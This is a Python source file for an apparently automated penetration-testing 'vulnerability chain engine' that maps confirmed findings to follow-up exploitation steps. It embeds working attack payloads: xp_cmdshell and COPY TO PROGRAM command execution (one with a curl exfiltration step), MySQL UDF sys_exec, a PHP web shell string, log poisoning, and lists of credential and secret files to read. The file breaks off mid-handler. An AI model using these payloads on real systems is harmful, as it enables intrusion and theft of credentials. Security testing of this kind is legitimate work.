"""
Vulnerability Chain Engine - Enterprise Edition

Implements intelligent vulnerability chaining:
- SQLi → RCE (via UDF, COPY TO PROGRAM, xp_cmdshell)
- LFI → Credential Extraction
- IDOR → Mass Data Enumeration
- Auth Bypass → Privilege Escalation
- SSRF → Cloud Metadata / Internal Scan
- XXE → File Read / SSRF
- Deserialization → RCE

Philosophy: "Vulnerabilities discover vulnerabilities"
A finding from one scanner triggers deeper testing by others.

Usage:
    from scanning.vuln_chain_engine import VulnerabilityChainEngine

    engine = VulnerabilityChainEngine(settings)
    engine.set_context(technologies=["php", "mysql"], target="https://example.com")

    # Process a finding and get chain results
    chain_findings = await engine.process_finding(sqli_finding)
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set
import asyncio
import logging
import re
from urllib.parse import urljoin, urlparse

import httpx

from utils.logger import get_logger

logger = get_logger(__name__)


class ChainTrigger(Enum):
    """Vulnerability types that can trigger chains."""
    SQLI_CONFIRMED = auto()
    SQLI_BLIND_CONFIRMED = auto()
    LFI_CONFIRMED = auto()
    RFI_CONFIRMED = auto()
    IDOR_CONFIRMED = auto()
    AUTH_BYPASS = auto()
    DEFAULT_CREDENTIALS = auto()
    OPEN_REDIRECT = auto()
    SSRF_CONFIRMED = auto()
    XXE_CONFIRMED = auto()
    DESERIALIZATION = auto()
    COMMAND_INJECTION = auto()
    SSTI_CONFIRMED = auto()
    PATH_TRAVERSAL = auto()
    INFO_DISCLOSURE = auto()
    WEAK_CRYPTO = auto()
    SESSION_FIXATION = auto()


class ChainPriority(Enum):
    """Priority levels for chain execution."""
    CRITICAL = 10  # Execute immediately (RCE chains)
    HIGH = 8       # Execute soon (credential extraction)
    MEDIUM = 5     # Execute when convenient
    LOW = 3        # Execute if time permits
    INFO = 1       # Informational only


@dataclass
class ChainRule:
    """Rule defining when and how to chain vulnerabilities."""
    trigger: ChainTrigger
    action: str
    priority: ChainPriority
    description: str
    condition: Optional[Callable[[Dict[str, Any]], bool]] = None
    required_context: Set[str] = field(default_factory=set)
    timeout: int = 60  # seconds


@dataclass
class ChainResult:
    """Result of executing a chain action."""
    success: bool
    action: str
    findings: List[Dict[str, Any]]
    evidence: Dict[str, Any]
    error: Optional[str] = None
    execution_time: float = 0.0


class VulnerabilityChainEngine:
    """
    Engine for intelligent vulnerability chaining.

    Processes findings from scanners and triggers deeper
    exploitation based on confirmed vulnerabilities.
    """

    # Mapping of vulnerability types to triggers
    VULN_TYPE_MAPPING: Dict[str, ChainTrigger] = {
        # SQLi variants
        "sql_injection": ChainTrigger.SQLI_CONFIRMED,
        "sqli": ChainTrigger.SQLI_CONFIRMED,
        "blind_sql_injection": ChainTrigger.SQLI_BLIND_CONFIRMED,
        "time_based_sqli": ChainTrigger.SQLI_BLIND_CONFIRMED,

        # File inclusion
        "local_file_inclusion": ChainTrigger.LFI_CONFIRMED,
        "lfi": ChainTrigger.LFI_CONFIRMED,
        "path_traversal": ChainTrigger.PATH_TRAVERSAL,
        "remote_file_inclusion": ChainTrigger.RFI_CONFIRMED,
        "rfi": ChainTrigger.RFI_CONFIRMED,

        # Access control
        "idor": ChainTrigger.IDOR_CONFIRMED,
        "insecure_direct_object_reference": ChainTrigger.IDOR_CONFIRMED,
        "broken_access_control": ChainTrigger.IDOR_CONFIRMED,

        # Authentication
        "authentication_bypass": ChainTrigger.AUTH_BYPASS,
        "auth_bypass": ChainTrigger.AUTH_BYPASS,
        "default_credentials": ChainTrigger.DEFAULT_CREDENTIALS,
        "weak_credentials": ChainTrigger.DEFAULT_CREDENTIALS,

        # Redirects
        "open_redirect": ChainTrigger.OPEN_REDIRECT,
        "url_redirect": ChainTrigger.OPEN_REDIRECT,

        # SSRF/XXE
        "ssrf": ChainTrigger.SSRF_CONFIRMED,
        "server_side_request_forgery": ChainTrigger.SSRF_CONFIRMED,
        "xxe": ChainTrigger.XXE_CONFIRMED,
        "xml_external_entity": ChainTrigger.XXE_CONFIRMED,

        # Code execution
        "deserialization": ChainTrigger.DESERIALIZATION,
        "insecure_deserialization": ChainTrigger.DESERIALIZATION,
        "command_injection": ChainTrigger.COMMAND_INJECTION,
        "cmdi": ChainTrigger.COMMAND_INJECTION,
        "rce": ChainTrigger.COMMAND_INJECTION,

        # Template injection
        "ssti": ChainTrigger.SSTI_CONFIRMED,
        "template_injection": ChainTrigger.SSTI_CONFIRMED,

        # Information disclosure
        "information_disclosure": ChainTrigger.INFO_DISCLOSURE,
        "sensitive_data_exposure": ChainTrigger.INFO_DISCLOSURE,
    }

    # Chain rules defining what actions to take for each trigger
    CHAIN_RULES: List[ChainRule] = [
        # ============================================
        # SQLi → RCE Chains
        # ============================================
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_mysql_udf_rce",
            priority=ChainPriority.CRITICAL,
            description="MySQL SQLi → UDF-based RCE",
            condition=lambda ctx: ctx.get("db_type") == "mysql",
            required_context={"db_type"},
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_postgres_copy_rce",
            priority=ChainPriority.CRITICAL,
            description="PostgreSQL SQLi → COPY TO PROGRAM RCE",
            condition=lambda ctx: ctx.get("db_type") == "postgresql",
            required_context={"db_type"},
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_mssql_xp_cmdshell",
            priority=ChainPriority.CRITICAL,
            description="MSSQL SQLi → xp_cmdshell RCE",
            condition=lambda ctx: ctx.get("db_type") == "mssql",
            required_context={"db_type"},
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_data_extraction",
            priority=ChainPriority.HIGH,
            description="SQLi → Extract database schema and data",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SQLI_CONFIRMED,
            action="sqli_file_read",
            priority=ChainPriority.HIGH,
            description="SQLi → Read files via LOAD_FILE/UTL_FILE",
            condition=None,
        ),

        # ============================================
        # LFI → Credential/Source Extraction
        # ============================================
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_extract_passwd",
            priority=ChainPriority.HIGH,
            description="LFI → Extract /etc/passwd and system files",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_extract_config",
            priority=ChainPriority.HIGH,
            description="LFI → Extract application config files",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_php_wrappers",
            priority=ChainPriority.CRITICAL,
            description="LFI + PHP → php://filter source code extraction",
            condition=lambda ctx: "php" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_log_poisoning",
            priority=ChainPriority.CRITICAL,
            description="LFI → Log poisoning for RCE",
            condition=lambda ctx: "php" in ctx.get("technologies", []) or "apache" in ctx.get("technologies", []),
        ),
        ChainRule(
            trigger=ChainTrigger.LFI_CONFIRMED,
            action="lfi_proc_environ",
            priority=ChainPriority.MEDIUM,
            description="LFI → /proc/self/environ for secrets",
            condition=None,
        ),

        # ============================================
        # IDOR → Mass Data Enumeration
        # ============================================
        ChainRule(
            trigger=ChainTrigger.IDOR_CONFIRMED,
            action="idor_enumerate_ids",
            priority=ChainPriority.HIGH,
            description="IDOR → Enumerate all accessible IDs",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.IDOR_CONFIRMED,
            action="idor_horizontal_escalation",
            priority=ChainPriority.HIGH,
            description="IDOR → Access other users' data",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.IDOR_CONFIRMED,
            action="idor_vertical_escalation",
            priority=ChainPriority.CRITICAL,
            description="IDOR → Access admin/privileged resources",
            condition=None,
        ),

        # ============================================
        # Auth Bypass → Privilege Escalation
        # ============================================
        ChainRule(
            trigger=ChainTrigger.AUTH_BYPASS,
            action="auth_test_admin_endpoints",
            priority=ChainPriority.CRITICAL,
            description="Auth bypass → Test admin functionality",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.AUTH_BYPASS,
            action="auth_enumerate_users",
            priority=ChainPriority.HIGH,
            description="Auth bypass → Enumerate users/roles",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.DEFAULT_CREDENTIALS,
            action="default_creds_authenticated_scan",
            priority=ChainPriority.HIGH,
            description="Default creds → Full authenticated scan",
            condition=None,
        ),

        # ============================================
        # SSRF → Internal Reconnaissance
        # ============================================
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_cloud_metadata",
            priority=ChainPriority.CRITICAL,
            description="SSRF → AWS/GCP/Azure metadata extraction",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_internal_port_scan",
            priority=ChainPriority.HIGH,
            description="SSRF → Internal network port scan",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.SSRF_CONFIRMED,
            action="ssrf_internal_services",
            priority=ChainPriority.HIGH,
            description="SSRF → Access internal services (Redis, MongoDB, etc.)",
            condition=None,
        ),

        # ============================================
        # XXE → File Read & SSRF
        # ============================================
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_file_extraction",
            priority=ChainPriority.HIGH,
            description="XXE → Extract sensitive files",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_ssrf",
            priority=ChainPriority.HIGH,
            description="XXE → SSRF to internal services",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.XXE_CONFIRMED,
            action="xxe_oob_exfiltration",
            priority=ChainPriority.CRITICAL,
            description="XXE → Out-of-band data exfiltration",
            condition=None,
        ),

        # ============================================
        # Deserialization → RCE
        # ============================================
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_java_gadget",
            priority=ChainPriority.CRITICAL,
            description="Java deserialization → ysoserial gadget chain RCE",
            condition=lambda ctx: "java" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_php_gadget",
            priority=ChainPriority.CRITICAL,
            description="PHP deserialization → Object injection RCE",
            condition=lambda ctx: "php" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_python_pickle",
            priority=ChainPriority.CRITICAL,
            description="Python pickle → RCE",
            condition=lambda ctx: "python" in ctx.get("technologies", []),
            required_context={"technologies"},
        ),
        ChainRule(
            trigger=ChainTrigger.DESERIALIZATION,
            action="deser_dotnet_gadget",
            priority=ChainPriority.CRITICAL,
            description=".NET deserialization → ysoserial.net RCE",
            condition=lambda ctx: any(t in ctx.get("technologies", []) for t in ["asp.net", ".net", "csharp"]),
            required_context={"technologies"},
        ),

        # ============================================
        # SSTI → RCE
        # ============================================
        ChainRule(
            trigger=ChainTrigger.SSTI_CONFIRMED,
            action="ssti_rce",
            priority=ChainPriority.CRITICAL,
            description="SSTI → Template engine RCE",
            condition=None,
        ),

        # ============================================
        # Command Injection → Post-Exploitation
        # ============================================
        ChainRule(
            trigger=ChainTrigger.COMMAND_INJECTION,
            action="cmdi_reverse_shell_prep",
            priority=ChainPriority.CRITICAL,
            description="CMDi → Prepare reverse shell commands",
            condition=None,
        ),
        ChainRule(
            trigger=ChainTrigger.COMMAND_INJECTION,
            action="cmdi_data_exfiltration",
            priority=ChainPriority.HIGH,
            description="CMDi → Extract sensitive data",
            condition=None,
        ),

        # ============================================
        # Open Redirect → OAuth/Auth Token Theft
        # ============================================
        ChainRule(
            trigger=ChainTrigger.OPEN_REDIRECT,
            action="redirect_oauth_theft",
            priority=ChainPriority.HIGH,
            description="Open redirect → OAuth token theft chain",
            condition=lambda ctx: any(t in ctx.get("technologies", []) for t in ["oauth", "oauth2", "oidc"]),
        ),
        ChainRule(
            trigger=ChainTrigger.OPEN_REDIRECT,
            action="redirect_phishing_demo",
            priority=ChainPriority.MEDIUM,
            description="Open redirect → Phishing chain demonstration",
            condition=None,
        ),

        # ============================================
        # Information Disclosure → Targeted Exploitation
        # ============================================
        ChainRule(
            trigger=ChainTrigger.INFO_DISCLOSURE,
            action="info_cve_search",
            priority=ChainPriority.HIGH,
            description="Info disclosure → CVE search for disclosed versions",
            condition=lambda ctx: ctx.get("disclosed_software") is not None,
        ),
        ChainRule(
            trigger=ChainTrigger.INFO_DISCLOSURE,
            action="info_credential_search",
            priority=ChainPriority.CRITICAL,
            description="Info disclosure → Search for leaked credentials",
            condition=lambda ctx: ctx.get("disclosure_type") == "source_code",
        ),
    ]

    def __init__(self, settings: Optional[Any] = None):
        """Initialize the chain engine."""
        self.settings = settings
        self.context: Dict[str, Any] = {}
        self.findings_processed: Set[str] = set()
        self.chain_results: List[ChainResult] = []
        self.http_client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(30.0)

        # Action handlers (will be loaded from chain_actions/)
        self._action_handlers: Dict[str, Callable] = {}
        self._load_action_handlers()

    def _load_action_handlers(self) -> None:
        """Load action handlers from chain_actions modules."""
        # Register built-in handlers
        self._action_handlers = {
            # SQLi chains
            "sqli_mysql_udf_rce": self._sqli_mysql_udf_rce,
            "sqli_postgres_copy_rce": self._sqli_postgres_copy_rce,
            "sqli_mssql_xp_cmdshell": self._sqli_mssql_xp_cmdshell,
            "sqli_data_extraction": self._sqli_data_extraction,
            "sqli_file_read": self._sqli_file_read,

            # LFI chains
            "lfi_extract_passwd": self._lfi_extract_passwd,
            "lfi_extract_config": self._lfi_extract_config,
            "lfi_php_wrappers": self._lfi_php_wrappers,
            "lfi_log_poisoning": self._lfi_log_poisoning,
            "lfi_proc_environ": self._lfi_proc_environ,

            # IDOR chains
            "idor_enumerate_ids": self._idor_enumerate_ids,
            "idor_horizontal_escalation": self._idor_horizontal_escalation,
            "idor_vertical_escalation": self._idor_vertical_escalation,

            # Auth chains
            "auth_test_admin_endpoints": self._auth_test_admin_endpoints,
            "auth_enumerate_users": self._auth_enumerate_users,
            "default_creds_authenticated_scan": self._default_creds_authenticated_scan,

            # SSRF chains
            "ssrf_cloud_metadata": self._ssrf_cloud_metadata,
            "ssrf_internal_port_scan": self._ssrf_internal_port_scan,
            "ssrf_internal_services": self._ssrf_internal_services,

            # XXE chains
            "xxe_file_extraction": self._xxe_file_extraction,
            "xxe_ssrf": self._xxe_ssrf,
            "xxe_oob_exfiltration": self._xxe_oob_exfiltration,

            # Deserialization chains
            "deser_java_gadget": self._deser_java_gadget,
            "deser_php_gadget": self._deser_php_gadget,
            "deser_python_pickle": self._deser_python_pickle,
            "deser_dotnet_gadget": self._deser_dotnet_gadget,

            # SSTI chains
            "ssti_rce": self._ssti_rce,

            # CMDi chains
            "cmdi_reverse_shell_prep": self._cmdi_reverse_shell_prep,
            "cmdi_data_exfiltration": self._cmdi_data_exfiltration,

            # Redirect chains
            "redirect_oauth_theft": self._redirect_oauth_theft,
            "redirect_phishing_demo": self._redirect_phishing_demo,

            # Info disclosure chains
            "info_cve_search": self._info_cve_search,
            "info_credential_search": self._info_credential_search,
        }

    def set_context(self, **kwargs) -> None:
        """Set context for chain evaluation."""
        self.context.update(kwargs)

    def get_context(self) -> Dict[str, Any]:
        """Get current context."""
        return self.context.copy()

    async def process_finding(self, finding: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Process a finding and execute applicable chains.

        Args:
            finding: A vulnerability finding dict

        Returns:
            List of new findings from chain execution
        """
        # Generate finding ID to avoid reprocessing
        finding_id = self._generate_finding_id(finding)
        if finding_id in self.findings_processed:
            logger.debug(f"Finding already processed: {finding_id}")
            return []

        self.findings_processed.add(finding_id)

        # Determine trigger from finding type
        trigger = self._finding_to_trigger(finding)
        if not trigger:
            logger.debug(f"No chain trigger for finding type: {finding.get('type')}")
            return []

        # Update context from finding
        self._update_context_from_finding(finding)

        # Find applicable rules
        applicable_rules = self._get_applicable_rules(trigger)
        if not applicable_rules:
            logger.debug(f"No applicable chain rules for trigger: {trigger}")
            return []

        logger.info(f"🔗 Chain Engine: {len(applicable_rules)} rules triggered by {trigger.name}")

        # Execute chains in priority order
        all_chain_findings = []
        for rule in sorted(applicable_rules, key=lambda r: r.priority.value, reverse=True):
            try:
                result = await self._execute_chain(rule, finding)
                self.chain_results.append(result)

                if result.success and result.findings:
                    logger.info(f"  ✓ Chain '{rule.action}' found {len(result.findings)} new findings")
                    all_chain_findings.extend(result.findings)
            except Exception as e:
                logger.warning(f"  ✗ Chain '{rule.action}' failed: {e}")

        return all_chain_findings

    def _generate_finding_id(self, finding: Dict[str, Any]) -> str:
        """Generate unique ID for a finding."""
        import hashlib
        key = f"{finding.get('type')}:{finding.get('matched_at')}:{finding.get('evidence', '')}"
        return hashlib.md5(key.encode()).hexdigest()

    def _finding_to_trigger(self, finding: Dict[str, Any]) -> Optional[ChainTrigger]:
        """Map finding type to chain trigger."""
        vuln_type = finding.get("type", "").lower().replace(" ", "_").replace("-", "_")
        return self.VULN_TYPE_MAPPING.get(vuln_type)

    def _update_context_from_finding(self, finding: Dict[str, Any]) -> None:
        """Extract context information from finding."""
        metadata = finding.get("metadata", {})

        # Extract database type from error messages
        if "error" in str(finding.get("evidence", "")).lower():
            evidence = str(finding.get("evidence", ""))
            if "mysql" in evidence.lower():
                self.context["db_type"] = "mysql"
            elif "postgresql" in evidence.lower() or "postgres" in evidence.lower():
                self.context["db_type"] = "postgresql"
            elif "microsoft" in evidence.lower() or "mssql" in evidence.lower():
                self.context["db_type"] = "mssql"
            elif "oracle" in evidence.lower():
                self.context["db_type"] = "oracle"
            elif "sqlite" in evidence.lower():
                self.context["db_type"] = "sqlite"

        # Extract working payload if available
        if metadata.get("poc", {}).get("working_payload"):
            self.context["working_payload"] = metadata["poc"]["working_payload"]

        # Extract vulnerable endpoint
        if finding.get("matched_at"):
            self.context["vulnerable_endpoint"] = finding["matched_at"]

        # Extract any disclosed software versions
        if metadata.get("version"):
            self.context["disclosed_software"] = metadata["version"]

    def _get_applicable_rules(self, trigger: ChainTrigger) -> List[ChainRule]:
        """Get rules applicable for a trigger given current context."""
        applicable = []

        for rule in self.CHAIN_RULES:
            if rule.trigger != trigger:
                continue

            # Check required context
            if rule.required_context:
                missing = rule.required_context - set(self.context.keys())
                if missing:
                    logger.debug(f"Rule '{rule.action}' missing context: {missing}")
                    continue

            # Check condition
            if rule.condition is not None:
                try:
                    if not rule.condition(self.context):
                        continue
                except Exception as e:
                    logger.debug(f"Rule '{rule.action}' condition failed: {e}")
                    continue

            applicable.append(rule)

        return applicable

    async def _execute_chain(self, rule: ChainRule, finding: Dict[str, Any]) -> ChainResult:
        """Execute a chain action."""
        import time
        start_time = time.time()

        handler = self._action_handlers.get(rule.action)
        if not handler:
            return ChainResult(
                success=False,
                action=rule.action,
                findings=[],
                evidence={},
                error=f"No handler for action: {rule.action}",
                execution_time=0.0,
            )

        try:
            findings = await asyncio.wait_for(
                handler(finding, self.context),
                timeout=rule.timeout
            )

            return ChainResult(
                success=True,
                action=rule.action,
                findings=findings,
                evidence={"trigger_finding": finding},
                execution_time=time.time() - start_time,
            )
        except asyncio.TimeoutError:
            return ChainResult(
                success=False,
                action=rule.action,
                findings=[],
                evidence={},
                error=f"Timeout after {rule.timeout}s",
                execution_time=rule.timeout,
            )
        except Exception as e:
            return ChainResult(
                success=False,
                action=rule.action,
                findings=[],
                evidence={},
                error=str(e),
                execution_time=time.time() - start_time,
            )

    # ============================================
    # Chain Action Handlers
    # ============================================

    async def _sqli_mysql_udf_rce(self, finding: Dict, context: Dict) -> List[Dict]:
        """MySQL UDF-based RCE attempt."""
        findings = []
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        working_payload = context.get("working_payload", "' OR '1'='1")

        # Check for FILE privilege
        file_check_payloads = [
            "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
            "' UNION SELECT @@plugin_dir-- -",
        ]

        findings.append({
            "type": "sqli_rce_chain",
            "name": "SQLi → MySQL UDF RCE Chain (Prepared)",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "SQL injection can potentially be escalated to RCE via MySQL UDF",
            "metadata": {
                "chain_type": "sqli_to_rce",
                "db_type": "mysql",
                "poc": {
                    "technique": "MySQL User Defined Function",
                    "steps": [
                        "1. Check FILE privilege: SELECT file_priv FROM mysql.user WHERE user=current_user()",
                        "2. Get plugin directory: SELECT @@plugin_dir",
                        "3. Write UDF shared object to plugin_dir",
                        "4. CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so'",
                        "5. SELECT sys_exec('id')",
                    ],
                    "requirements": ["FILE privilege", "Write access to plugin_dir"],
                    "working_payload": working_payload,
                },
            },
        })

        return findings

    async def _sqli_postgres_copy_rce(self, finding: Dict, context: Dict) -> List[Dict]:
        """PostgreSQL COPY TO PROGRAM RCE."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "sqli_rce_chain",
            "name": "SQLi → PostgreSQL COPY TO PROGRAM RCE Chain",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "SQL injection can be escalated to RCE via COPY TO PROGRAM",
            "metadata": {
                "chain_type": "sqli_to_rce",
                "db_type": "postgresql",
                "poc": {
                    "technique": "PostgreSQL COPY TO PROGRAM",
                    "payload": "'; COPY (SELECT '') TO PROGRAM 'id';--",
                    "steps": [
                        "1. Verify stacked queries work: '; SELECT pg_sleep(5);--",
                        "2. Execute command: '; COPY (SELECT '') TO PROGRAM 'id';--",
                        "3. For data exfil: COPY (SELECT pg_read_file('/etc/passwd')) TO PROGRAM 'curl ...'",
                    ],
                    "requirements": ["Stacked queries", "COPY privilege"],
                },
            },
        }]

    async def _sqli_mssql_xp_cmdshell(self, finding: Dict, context: Dict) -> List[Dict]:
        """MSSQL xp_cmdshell RCE."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "sqli_rce_chain",
            "name": "SQLi → MSSQL xp_cmdshell RCE Chain",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "SQL injection can be escalated to RCE via xp_cmdshell",
            "metadata": {
                "chain_type": "sqli_to_rce",
                "db_type": "mssql",
                "poc": {
                    "technique": "MSSQL xp_cmdshell",
                    "steps": [
                        "1. Enable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                        "2. Execute command: EXEC xp_cmdshell 'whoami';",
                        "3. If disabled, enable advanced options first: EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                    ],
                    "payload": "'; EXEC xp_cmdshell 'whoami';--",
                    "requirements": ["sysadmin role", "xp_cmdshell enabled"],
                },
            },
        }]

    async def _sqli_data_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
        """SQLi data extraction preparation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        db_type = context.get("db_type", "unknown")

        extraction_payloads = {
            "mysql": [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,table_name FROM information_schema.columns--",
            ],
            "postgresql": [
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,table_name FROM information_schema.columns--",
            ],
            "mssql": [
                "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                "' UNION SELECT name,object_id FROM sys.columns--",
            ],
        }

        return [{
            "type": "sqli_data_extraction_chain",
            "name": f"SQLi → Data Extraction Ready ({db_type})",
            "severity": "HIGH",
            "matched_at": endpoint,
            "description": "SQL injection confirmed - database schema extraction possible",
            "metadata": {
                "chain_type": "sqli_data_extraction",
                "db_type": db_type,
                "poc": {
                    "extraction_payloads": extraction_payloads.get(db_type, extraction_payloads["mysql"]),
                    "steps": [
                        "1. Enumerate tables: SELECT table_name FROM information_schema.tables",
                        "2. Enumerate columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'",
                        "3. Extract data: SELECT username, password FROM users",
                    ],
                },
            },
        }]

    async def _sqli_file_read(self, finding: Dict, context: Dict) -> List[Dict]:
        """SQLi file read capability."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        db_type = context.get("db_type", "unknown")

        file_read_methods = {
            "mysql": "LOAD_FILE('/etc/passwd')",
            "postgresql": "pg_read_file('/etc/passwd')",
            "mssql": "OPENROWSET(BULK 'C:\\boot.ini', SINGLE_CLOB) AS Contents",
        }

        return [{
            "type": "sqli_file_read_chain",
            "name": f"SQLi → File Read Capability ({db_type})",
            "severity": "HIGH",
            "matched_at": endpoint,
            "description": "SQL injection may allow reading server files",
            "metadata": {
                "chain_type": "sqli_file_read",
                "db_type": db_type,
                "poc": {
                    "method": file_read_methods.get(db_type, "LOAD_FILE()"),
                    "target_files": ["/etc/passwd", "/etc/shadow", "/var/www/.env", "C:\\boot.ini"],
                },
            },
        }]

    async def _lfi_extract_passwd(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI /etc/passwd extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        working_payload = context.get("working_payload", "../../../etc/passwd")

        return [{
            "type": "lfi_extraction_chain",
            "name": "LFI → System Files Extraction",
            "severity": "HIGH",
            "matched_at": endpoint,
            "description": "LFI confirmed - extracting sensitive system files",
            "metadata": {
                "chain_type": "lfi_extraction",
                "poc": {
                    "working_payload": working_payload,
                    "target_files": [
                        "/etc/passwd",
                        "/etc/shadow",
                        "/etc/hosts",
                        "/proc/self/environ",
                        "/proc/self/cmdline",
                        "/var/log/auth.log",
                    ],
                },
            },
        }]

    async def _lfi_extract_config(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI config file extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
        technologies = context.get("technologies", [])

        config_files = [
            "/.env",
            "/config/database.yml",
            "/config/secrets.yml",
            "/app/config/parameters.yml",
        ]

        if "php" in technologies:
            config_files.extend(["/wp-config.php", "/configuration.php", "/config.php"])
        if "python" in technologies:
            config_files.extend(["/settings.py", "/local_settings.py"])
        if "java" in technologies:
            config_files.extend(["/application.properties", "/application.yml"])

        return [{
            "type": "lfi_config_extraction_chain",
            "name": "LFI → Application Config Extraction",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "LFI can extract application configuration with credentials",
            "metadata": {
                "chain_type": "lfi_config_extraction",
                "poc": {
                    "target_files": config_files,
                    "expected_secrets": ["database_password", "api_keys", "jwt_secret"],
                },
            },
        }]

    async def _lfi_php_wrappers(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI PHP wrapper exploitation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "lfi_php_wrapper_chain",
            "name": "LFI → PHP Filter Source Code Disclosure",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "LFI with PHP allows source code extraction via php://filter",
            "metadata": {
                "chain_type": "lfi_php_wrapper",
                "poc": {
                    "payload": "php://filter/convert.base64-encode/resource=index.php",
                    "steps": [
                        "1. Use php://filter to encode source code",
                        "2. Base64 decode the response to get source",
                        "3. Search for hardcoded credentials, API keys, DB passwords",
                    ],
                    "rce_payload": "php://input with POST body: <?php system($_GET['cmd']); ?>",
                },
            },
        }]

    async def _lfi_log_poisoning(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI log poisoning for RCE."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "lfi_log_poisoning_chain",
            "name": "LFI → Log Poisoning RCE",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "LFI can be escalated to RCE via log poisoning",
            "metadata": {
                "chain_type": "lfi_log_poisoning_rce",
                "poc": {
                    "steps": [
                        "1. Send malicious User-Agent: <?php system($_GET['cmd']); ?>",
                        "2. Include access log: ../../../var/log/apache2/access.log",
                        "3. Add ?cmd=id to execute commands",
                    ],
                    "log_files": [
                        "/var/log/apache2/access.log",
                        "/var/log/nginx/access.log",
                        "/var/log/httpd/access_log",
                        "/proc/self/fd/1",
                    ],
                },
            },
        }]

    async def _lfi_proc_environ(self, finding: Dict, context: Dict) -> List[Dict]:
        """LFI /proc/self/environ exploitation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "lfi_proc_chain",
            "name": "LFI → /proc/self/environ Secrets",
            "severity": "HIGH",
            "matched_at": endpoint,
            "description": "LFI can read process environment variables for secrets",
            "metadata": {
                "chain_type": "lfi_proc_environ",
                "poc": {
                    "payload": "../../../proc/self/environ",
                    "expected_secrets": ["AWS_SECRET_ACCESS_KEY", "DATABASE_URL", "API_KEY"],
                },
            },
        }]

    async def _idor_enumerate_ids(self, finding: Dict, context: Dict) -> List[Dict]:
        """IDOR ID enumeration."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "idor_enumeration_chain",
            "name": "IDOR → Mass ID Enumeration",
            "severity": "HIGH",
            "matched_at": endpoint,
            "description": "IDOR allows enumerating all accessible resources",
            "metadata": {
                "chain_type": "idor_enumeration",
                "poc": {
                    "enumeration_range": "1-10000",
                    "steps": [
                        "1. Identify ID parameter pattern",
                        "2. Enumerate IDs: 1, 2, 3, ..., 10000",
                        "3. Collect all accessible records",
                        "4. Report total data exposure",
                    ],
                },
            },
        }]

    async def _idor_horizontal_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
        """IDOR horizontal privilege escalation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "idor_horizontal_chain",
            "name": "IDOR → Horizontal Privilege Escalation",
            "severity": "HIGH",
            "matched_at": endpoint,
            "description": "IDOR allows accessing other users' data at same privilege level",
            "metadata": {
                "chain_type": "idor_horizontal",
                "poc": {
                    "steps": [
